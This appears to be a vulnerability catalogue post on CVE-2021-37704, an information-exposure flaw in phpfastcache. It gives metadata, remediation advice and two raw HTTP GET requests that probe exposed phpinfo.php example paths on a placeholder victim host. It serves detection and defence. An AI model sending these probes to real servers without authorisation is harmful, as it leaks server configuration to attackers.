---
layout: "post"
cve_id: "CVE-2021-37704"
title: "phpfastcache - phpinfo Resource Exposure"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-37704.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-37704.yaml"
author: "whoever"
severity: "medium"
impact: "An attacker can gain access to sensitive information, such as server configuration details, PHP version, and installed extensions.
"
remediation: "Remove or restrict access to the phpinfo.php file in the phpfastcache library.
"
reference:
  - "https://github.com/PHPSocialNetwork/phpfastcache/pull/813 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37704"
  - "https://github.com/PHPSocialNetwork/phpfastcache/security/advisories/GHSA-cvh5-p6r6-g2qc"
  - "https://packagist.org/packages/phpfastcache/phpfastcache"
  - "https://github.com/PHPSocialNetwork/phpfastcache/blob/master/CHANGELOG.md#807"
  - "https://github.com/PHPSocialNetwork/phpfastcache/commit/41a77d0d8f126dbd6fbedcd9e6a82e86cdaafa51"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N', 'cvss-score': 4.3, 'cve-id': 'CVE-2021-37704', 'cwe-id': 'CWE-668,CWE-200', 'epss-score': 0.47802, 'epss-percentile': 0.97606, 'cpe': 'cpe:2.3:a:phpfastcache:phpfastcache:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'phpfastcache', 'product': 'phpfastcache'}"
tags:
  - "cve2021"
  - "cve"
  - "exposure"
  - "phpfastcache"
  - "phpinfo"
  - "phpsocialnetwork"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
phpinfo() is susceptible to resource exposure in unprotected composer vendor folders via phpfastcache/phpfastcache.

## üåê HTTP Request
```nohighlight
GET /vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /vendor/phpfastcache/phpfastcache/examples/phpinfo.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

